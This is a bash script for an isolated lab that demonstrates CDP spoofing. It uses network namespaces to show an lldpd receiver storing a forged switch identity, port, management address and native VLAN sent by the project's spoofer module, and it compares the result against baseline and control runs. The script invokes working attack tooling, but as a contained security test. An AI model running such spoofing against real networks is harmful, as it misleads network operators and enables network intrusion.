#!/usr/bin/env bash
# Isolated CDP spoofing lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with two hosts attached:
#
#   receiver: lldpd in receive-only mode with CDP support, standing in for a Cisco
#             switch that keeps CDP neighbors. Its neighbor table is read with lldpctl.
#   attacker: MACabre's CDP spoofer. It advertises a switch named MACabre-SW on port
#             FastEthernet0/1, with management address 10.99.0.9 and native VLAN 20.
#
# Phases:
#   Phase 1 (baseline): CDP enabled on the receiver, no advertisements. No CDP neighbor.
#   Phase 2 (attack): CDP enabled, the attacker advertises. The receiver stores the
#            forged neighbor, and its name, port, address and VLAN match the advertisement.
#   Phase 3 (control): CDP disabled on the receiver, the attacker advertises. Nothing is
#            stored, which shows that the receiver's CDP support is what accepts it.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/cdp_spoofing_lab.sh
#   sudo ADVERTISEMENTS=5 scripts/lab/cdp_spoofing_lab.sh
#
# Requirements: iproute2, lldpd (with CDP support, `lldpd -c`), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip lldpd lldpctl; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ADVERTISEMENTS="${ADVERTISEMENTS:-3}"
WORK="$(mktemp -d)"
chmod 755 "$WORK"   # lldpd drops privileges and must reach its control socket here
SOCK="$WORK/lldpd.sock"
FORGED_NAME="MACabre-SW"
FORGED_PORT="FastEthernet0/1"
FORGED_ADDR="10.99.0.9"
FORGED_VLAN="20"

stop_receiver() {
    for pid in $(ip netns pids receiver 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    # Wait until the receiver's lldpd processes, including its monitor, have exited.
    for _ in $(seq 1 10); do
        [[ -z "$(ip netns pids receiver 2>/dev/null || true)" ]] && break
        sleep 0.5
    done
}

stop_lab() {
    stop_receiver
    for ns in attacker receiver lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
  rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add receiver
ip netns add attacker

for pair in "rcv:receiver" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in rcv att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done
ip netns exec receiver ip link set h-rcv up
ip netns exec attacker ip link set h-att up

# Start the receiver's lldpd. Receive-only, on the receiver's interface, with CDP support
# only when the first argument is "cdp".
start_receiver() {
    local flags="-r"
    if [[ "${1:-}" == "cdp" ]]; then
        flags="$flags -c"
    fi
    SOCK="$WORK/lldpd-$RANDOM.sock"
    rm -f "$SOCK"
    ip netns exec receiver lldpd -d $flags -I h-rcv -u "$SOCK" >>"$WORK/lldpd.log" 2>&1 &
    for _ in $(seq 1 20); do
        [[ -S "$SOCK" ]] && break
        sleep 0.25
    done
    sleep 1
}

neighbors() {
    ip netns exec receiver lldpctl -u "$SOCK" -f keyvalue 2>/dev/null || true
}

ATTACK_CODE='
import os, threading
from macabre.attacks.cdp_spoofing import CdpSpoofingConfig, run_cdp_spoofing
stats = run_cdp_spoofing(
    CdpSpoofingConfig(
        iface="h-att",
        device_id=os.environ["FORGED_NAME"],
        port_id=os.environ["FORGED_PORT"],
        address=os.environ["FORGED_ADDR"],
        native_vlan=int(os.environ["FORGED_VLAN"]),
        count=int(os.environ["ADVERTISEMENTS"]),
        interval=1.0,
    ),
    threading.Event(),
    lambda _: None,
)
name = os.environ["FORGED_NAME"]
print(f"Spoofer: sent {stats.frames} CDP advertisements for {name}")
'

run_attack() {
    ip netns exec attacker env PYTHONPATH="$ROOT/src" FORGED_NAME="$FORGED_NAME" FORGED_PORT="$FORGED_PORT" \
        FORGED_ADDR="$FORGED_ADDR" FORGED_VLAN="$FORGED_VLAN" ADVERTISEMENTS="$ADVERTISEMENTS" "$PY" -c "$ATTACK_CODE"
}

# Summarize what the receiver stored for CDP neighbors.
report() {
    local out="$1"
    local count
    count="$(grep -c 'via=CDPv2' "$out" || true)"
    if (( count == 0 )); then
        echo "Receiver: no CDP neighbor stored."
        return
    fi
    local name port addr vlan
    name="$(grep 'chassis.name=' "$out" | head -1 | cut -d= -f2)"
    port="$(grep 'port.ifname=' "$out" | head -1 | cut -d= -f2)"
    addr="$(grep 'chassis.mgmt-ip=' "$out" | head -1 | cut -d= -f2)"
    vlan="$(grep 'vlan.vlan-id=' "$out" | head -1 | cut -d= -f2)"
    echo "Receiver: stored a CDP neighbor named $name on port $port, management address $addr, native VLAN $vlan."
}

echo "Phase 1: baseline, CDP enabled on the receiver, no advertisements"
start_receiver cdp
neighbors > "$WORK/baseline.txt"
report "$WORK/baseline.txt"
stop_receiver
echo

echo "Phase 2: CDP enabled on the receiver, attacker advertises $FORGED_NAME"
start_receiver cdp
run_attack
sleep 3
neighbors > "$WORK/attack.txt"
report "$WORK/attack.txt"
stop_receiver
echo

echo "Phase 3: CDP disabled on the receiver, attacker advertises $FORGED_NAME"
start_receiver
run_attack
sleep 3
neighbors > "$WORK/control.txt"
report "$WORK/control.txt"
stop_receiver
echo

if grep -q 'chassis.name=MACabre-SW' "$WORK/attack.txt" \
    && grep -q "chassis.mgmt-ip=$FORGED_ADDR" "$WORK/attack.txt" \
    && grep -q "vlan.vlan-id=$FORGED_VLAN" "$WORK/attack.txt"; then
    echo "Attack: the receiver accepted the forged identity, port, address and native VLAN. Vulnerable when CDP is enabled."
else
    echo "Attack: the receiver did not store the forged neighbor. Result unreliable."
fi
if grep -q 'via=CDPv2' "$WORK/control.txt"; then
    echo "Control: a neighbor was stored with CDP disabled. Result unreliable."
else
    echo "Control: with CDP disabled on the receiver, nothing was stored."
fi
